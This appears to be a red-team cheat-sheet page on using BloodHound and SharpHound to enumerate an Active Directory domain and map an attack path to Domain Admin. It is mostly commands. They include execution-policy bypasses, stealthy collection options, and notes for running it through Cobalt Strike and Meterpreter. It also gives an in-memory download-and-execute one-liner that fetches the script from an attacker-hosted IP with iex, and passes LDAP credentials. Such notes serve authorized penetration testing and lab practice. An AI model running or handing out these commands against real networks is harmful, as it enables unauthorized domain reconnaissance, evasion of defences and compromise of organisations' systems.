# BloodHound \(SharpHound\)



#### BloodHound \(SharpHound\) <a id="bloodhound-sharphound"></a>

Great for quickly enumurating a domain to determine an attack path

```text
Set-ExecutionPolicy RemoteSigned
Powershell -Exec Bypass (from cmd)
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod Session -Stealth -Verbose
or
Invoke-BloodHound -CollectionMethod All -CompressData

or

powershell-import /usr/lib/bloodhound/resources/app/Ingestors/SharpHound.ps1
powershell Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV

        Runs ACL, ObjectProps, Container, and Default collection methods sequentially, compressed the data to a zip file,
        and then removes the CSV files from diskMATC


GUI side
/usr/bin/neo4j console
defaults neoj4 bloodhound

Note:
In cobalt can use powerpick or powershell-import and in meterpreter use "load powershell" and can run items in memory but still needs to save to disk

Note: Default Location
/usr/lib/bloodhound/resources/app/Ingestors/SharpHound.exe
/usr/lib/bloodhound/resources/app/Ingestors/SharpHound.ps1
```

if running into to powershell issues then try running straight from SysWOW if not located there use the "where" command to determine location. "where" is equivalent to "which" on linux.

```text
 where explorer

 C:\Windows\explorer.exe
```

Note if you cant find a path to DA, most likely dont have enough user data

try the following neo4j script to determine how much of user session data and from there try running sharphound with an hour to 2 hour loop

```text
MATCH (u1:User)
WITH COUNT(u1) AS totalUsers
MATCH (c:Computer)-[r:HasSession]->(u2:user)
RETURN 100 * COUNT(DISTINCT(u2)) / totalUsers AS userPercentage
```

```text
-c SessionLoop
```

### Without touching disk:

Often touching the disk can be problematic. This will download and execute in memory:

```text
powershell -c "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.15:8000/SharpHound.ps1');Invoke-BloodHound  -SearchForest -CompressData  -CollectionMethod All,GPOLocalGroup,LoggedOn  -IgnoreLdapCert -Domain DOMAIN.local -LDAPUser USER -LDAPPass PASS -DomainController 10.10.10.161" 
```

